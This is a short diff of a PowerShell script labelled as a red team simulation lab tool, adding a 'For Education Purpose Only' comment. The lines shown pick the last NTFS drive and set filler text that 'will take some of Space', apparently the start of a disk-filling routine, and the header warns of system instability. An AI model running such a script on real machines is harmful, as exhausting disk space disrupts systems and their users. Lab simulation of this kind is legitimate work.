@@ -5,7 +5,8 @@
 #          red team simulation labs ONLY.
 # WARNING: Running this outside an isolated VM or test
 #          environment may cause system instability.
-
+# PURPOSE: For Education Purpose Only 
+# ============================================================
 
 $A = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter -Last 1 #Choose The Volume
 $B = " bug0x "  # Text in Text File which will take some of Space
